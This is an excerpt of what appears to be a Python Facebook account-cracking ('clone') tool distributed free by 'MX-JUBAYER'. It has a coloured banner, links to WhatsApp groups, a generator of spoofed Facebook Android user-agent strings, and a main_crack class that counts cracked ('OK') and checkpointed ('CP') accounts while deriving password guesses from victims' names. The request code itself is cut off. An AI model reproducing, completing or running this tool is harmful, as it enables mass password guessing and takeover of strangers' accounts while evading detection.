...
\033[0;92m╩ ╩╚═╝╩╩╚═  ╚╝╚═╝╚═╝╩ ╩ ╩ ╚═╝╩╚═
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;37m[\033[1;31mâ€¢\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mMX-JUBAYER
\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mTOOLS        :   \033[1;32mFILE-CLONE
\033[1;37m[\033[1;33mâ€¢\033[1;37m]\033[1;33mVERSION      :   \033[1;33m 1.0.0
\033[1;37m[\033[1;34mâ€¢\033[1;37m]\033[1;34mWORKING      :   \033[1;34mDATA/WIFI
\033[1;37m[\033[1;35mâ€¢\033[1;37m]\033[1;35mSTATUS       :   \033[1;35mFREE
\033[1;32m------------------------------------------------------"""
def clear():
    os.system("clear")
    print(logo) 
...
def DANGER():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://chat.whatsapp.com/J4eMwKIVB7rC869rlOoDbK')
        pass
    elif select =='3':
        os.system('xdg-open https://chat.whatsapp.com/J4eMwKIVB7rC869rlOoDbK/')
    else:
...
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/178.0.0.57.86;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110M;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[MX-JUBAYER] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
